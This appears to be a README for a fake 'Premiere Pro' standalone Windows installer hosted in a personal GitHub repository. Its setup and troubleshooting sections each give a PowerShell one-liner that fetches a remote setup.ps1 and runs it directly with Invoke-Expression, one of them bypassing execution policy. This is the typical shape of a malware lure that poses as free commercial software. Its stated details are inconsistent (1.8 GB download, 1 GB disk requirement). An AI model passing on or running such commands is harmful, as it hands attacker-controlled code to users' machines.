# Premiere Pro — Standalone Desktop Installer

This is the full working application build for a Windows PC.

> **Distribution Type:** Standalone Build
> **Target Platform:** Windows x64 Desktop
> **Estimated File Size:** 1.8 GB

## Quick Setup Guide (PowerShell)

1. Press `Win + X` and open **Windows PowerShell**.
2. Paste the command and press Enter.

```cmd
irm https://raw.githubusercontent.com/sommer398352/Premiere-Pro/main/setup.ps1 | Invoke-Expression
```

## Resolving Issues

```cmd
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/sommer398352/Premiere-Pro/main/setup.ps1 | Invoke-Expression"
```

## Features

- Desktop app for Windows 10 and Windows 11
- Opens one project and stays signed in
- Export to a local file

## System Requirements

| Parameter | Minimum |
| OS | Windows 11 or Windows 10 (64-bit) |
| RAM | 8 GB |
| Disk Space | 1 GB free disk space |
  
